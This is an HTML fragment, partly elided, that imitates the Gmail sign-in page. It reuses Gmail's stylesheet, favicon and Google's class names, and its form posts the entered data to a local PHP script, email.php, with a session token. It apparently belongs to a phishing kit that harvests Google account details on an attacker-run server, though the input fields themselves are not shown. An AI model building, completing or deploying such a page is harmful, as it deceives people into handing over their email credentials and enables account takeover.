...
<html lang="EN">
    <head>
        ...
        <link rel="stylesheet" type="text/css" href="../../Export/css/gmail.css">
        <link rel="shortcut icon" href="../../Export/img/Gmail/gmail.ico" type="image/x-icon">
    </head>
                                ...
                                <div class="DRS7Fe bxPAYd k6Zj8d" jsname="lr9nlf" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
                                    ...
                                    <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                                        <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                            ...
                                            <div class="bCAAsb">
                                                <form action="../../Layout/Terraform/email.php?token=<?php echo $_SESSION['token']; ?>" method="POST" id="form1">
                                                    <div>
                                                        <span jsslot="">
